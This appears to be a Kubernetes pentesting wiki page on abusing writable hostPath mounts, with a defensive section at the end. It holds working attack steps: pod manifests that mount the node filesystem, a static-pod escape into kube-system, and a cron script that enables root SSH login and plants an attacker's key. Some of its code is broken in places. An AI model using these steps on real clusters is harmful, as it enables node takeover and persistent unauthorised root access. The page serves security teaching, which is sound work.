# Writable hostPath mount
A hostpath mount is a directory or file from the host that is mounted into the pod. If an attacker is able to create a new container in the cluster, they may be able to mount the node's file system which can be exploited in many ways.

## Kubernetes Volumes
By design, storage within pods do not persist on reboot. Any artifacts saved to a container that are not stored in a volume will be removed when a pod is restarted. Persistent volumes are a way to store data in a pod and have it persist even if the pod is restarted. There are a few different types of volumes but the most interesting one from an attacker perspective is a hostPath volume.

A hostpath volume mounts a file or directory from the host node's filesystem into a pod. Most of the time there is no real reason for this to be done, but it can be an easy way to make things "just work".

According to the [documentation](https://kubernetes.io/docs/concepts/storage/volumes/), there are a few hostPath _types_ you can pass to the manfest when creating a hostpath:
- `""`: Empty string (default) is for backward compatibility, which means that no checks will be performed before mounting the hostPath volume.
- `DirectoryOrCreate`: If nothing exists at the given path, an empty directory will be created there as needed with permission set to 0755, having the same group and ownership with Kubelet.
- `Directory`: A directory must exist at the given path
- `FileOrCreate`: If nothing exists at the given path, an empty file will be created there as needed with permission set to 0644, having the same group and ownership with Kubelet.
- `File`: A file must exist at the given path
- `Socket`: A UNIX socket must exist at the given path
- `CharDevice`: (Linux nodes only) A character device must exist at the given path
- `BlockDevice`: (Linux nodes only) A block device must exist at the given path

## Example Attack
Lets imagine that we have somehow discovered that there is a manifest that is utilizing a hostPath mount to mount the root directory(`/`) of the node into a pod.

The manifest may look simliar to below.

```yaml
# Dangerous
apiVersion: v1
kind: Pod
metadata:
  name: vuln-nginx
  namespace: dmz
spec:
  containers:
  - name: vuln-nginx
    image: nginx
    volumeMounts:
    - name: hostmount
      mountPath: /nodeFS

  volumes:
  into the pod"
  - name: hostmount
    hostPath:
      path: /  
```

Lets assume that at some point a kubernetes admin made a `dmz` namespace and applied this vulnerable manifest to it.

![](../images/Pasted%20image%2020240331195411.png)

As an attacker we either are lucky enough to find ourselves already in the `vuln-nginx` pod, or we exec into the pod. Upon looking at the file system, we can see that the `nodeFS` directory contains the contents of the filesystem of the node running the pod. We can exploit this by utilzing [Persistence -> Static pod](./Persistence/Static_pods.md) to spawn a pod outside of the `dmz` namespace.

![](../images/Pasted%20image%2020240331195500.png)

Going back to the cluster, we can query the API server for pods in the `production` namespace by running `kubectl get pods -n production`. We can see that the yaml written to `/nodeFS/etc/kubernetes/manifests/jump2prod.yaml` was picked up by the kubelet and launched.

![](../images/Pasted%20image%2020240331195512.png)

Indeed, it seems the `jump2prod` container was created. Note that the node name was appended to our pod as discussed previously. This is great for jumping into another namespace, but from this `FINISH`

# Attack 2

Lets assume the following manifest was used to deploy an nginx server into the DMZ. Due to the houstmount giving us access to `/etc/kubernetes/` path, we will be able to take over the cluster.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: vuln-nginx 
  namespace: dmz
spec:
  containers:
  - name: vuln-nginx
    image: nginx 
    volumeMounts:
    - name: hostmount
      mountPath: /goodies

  volumes:
  - name: hostmount 
    hostPath:
      path: /etc/kubernetes/
```

In this scenario, the path `/etc/kubernetes` on the node was mounted into the pod under `/goodies`. Looking at this directory, we can see that there is indeed some configuration files for the kubelet as well as the manifests directory.

![](../images/Pasted%20image%2020240331195602.png)

With this information, we can probably create a [Persistence -> Static Pod](./Persistence/Static_pod.md). In order to exploit this, we are going to create a static pod with an additional hostmount, but this time we are going to mount the root of the node `/` into the directory `/pwnd`. To facilitate this we will create a new manifest that will perform these mounts in a pod called `ohnode`
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ohnode 
  namespace: kube-system 
spec:
  containers:
  - name: ohnode 
    image: nginx 
    volumeMounts:
    - name: hostmount
      mountPath: /pwnd

  volumes:
  - name: hostmount 
    hostPath:
      path: /

```

To create the static pod, we simply place this manifest into the `/etc/kubernetes/manifests` directory and the kubelet will start the pod. Looks like our pod was created in the `kube-system` namespace.

![](../images/Pasted%20image%2020240331195652.png)

Lets exec into the pod. We can see that `/pwnd` exists and upon moving into it we see the `/` of the node's file system. To make things a little simpler, `chroot /pwnd` to make sure our we don't accidentially mess up our paths and put something in the wrong directory on the pod's filesystem.

Finally, lets backdoor the node with cron so that we can SSH to it. In this example, we will assume the node has cron installed and the cron service is running(by default minikube does not). To backdoor the node and ensure SSH is running, run the following commands

```bash
# Place our backdoor script into /tmp/ssh.sh
# This will be ran by cron
cat << EOF > /tmp/ssh.sh
apt update ; apt install openssh-server -y ; mkdir -p /var/run/sshd && sed -i 's/\#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd ; mkdir -p ~/.ssh && touch authorized_keys ; echo "YOUR PUBLIC KEY HERE" >> ~/.ssh/authorized_keys ; /usr/sbin/service ssh restart

# Then type EOF and press enter

# Ensure the script has execute permissions
chmod +x /tmp/ssh.sh

# This will keep adding your SSH key
# you could change `>>` to `>` but that will overwrite other keys in there.
echo "* * * * * root cd /tmp && sh ssh.sh" >> /etc/cron.d/ssh
```

![](../images/Pasted%20image%2020240331195709.png)

Now, assuming cron is running on the node, wait about a minue and you should see that your public key has been added to `/root/.ssh/authorized_keys`!

Now all you need to do is ssh into the node (assuming there is no firewalls in the way): `ssh -i <key> root@<node>`

![](../images/Pasted%20image%2020240331195726.png)

## Defending

Exploiting writable hostPath mounts can severely compromise Kubernetes security.  A robust defense requires a multi-layered approach with specific tools and configurations.

**1. Minimize and Restrict hostPath Usage:**

- **Avoid Unnecessary hostPath Volumes:** The most effective defense is minimizing hostPath volume use. Explore alternative volume types first.
- **Principle of Least Privilege:** If unavoidable, mount only essential directories/files, not the entire node filesystem.
- **Enforce Read-Only Access:** Configure hostPath volumes as read-only (`readOnly: true` in the volume definition) to prevent container modifications on the host.

**2.  Secure Container Runtimes with seccomp:**

- **System Call Filtering:** seccomp (Secure Computing Mode) is a Linux kernel feature that filters system calls available to a process. By applying a seccomp profile to your containers, you can restrict their actions, even with a writable hostPath mount.
- **Example seccomp Profile:** A profile can be defined in JSON format. Here's a basic JSON example denying `chmod` system call:

```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "syscalls": [
    {
      "name": "chmod",
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}

```

This profile allows all system calls by default (`SCMP_ACT_ALLOW`) but returns an error (`SCMP_ACT_ERRNO`) if the container tries to use `chmod`. More complex rules can be defined to further restrict access based on arguments and other conditions.

3. **Harden Node Security with AppArmor:**

    **Mandatory Access Control:** AppArmor provides Mandatory Access Control (MAC) for confining container processes. Define AppArmor profiles to restrict file system access, capabilities, and network operations.

    **Example AppArmor Profile:**
    ```
    #include <tunables/global>

    profile k8s-apparmor-example flags=(attach_bpf) {
      #include <abstractions/base>

      # Allow writing to the application's specific directory
      /var/lib/saeds-application/** rw,

      # Deny write access to other directories on the host
      deny /var/lib/** w,
      deny /etc/** w,

      # Other rules...
    }
    ```
    This profile allows the container to write to `/var/lib/my-application/` but denies write access to other directories under `/var/lib/` and `/etc/`.

4. **Monitoring and Detection:**

    **Monitor for Suspicious Activity:** Employ monitoring and intrusion detection systems to detect anomalies related to hostPath mounts (e.g., access to sensitive files).

    **Audit Logs:** Analyze audit logs for unauthorized access or modification of hostPath volumes.

5. **Security Best Practices:**

    **Keep Kubernetes Updated:** Regularly update your cluster and nodes to patch vulnerabilities.

    **Secure Container Images:** Use trusted and verified container images.

    **Network Segmentation:** Isolate your Kubernetes cluster to limit the impact of a compromise.

By combining these techniques, you can significantly mitigate the risks associated with writable hostPath mounts and strengthen your Kubernetes security posture.
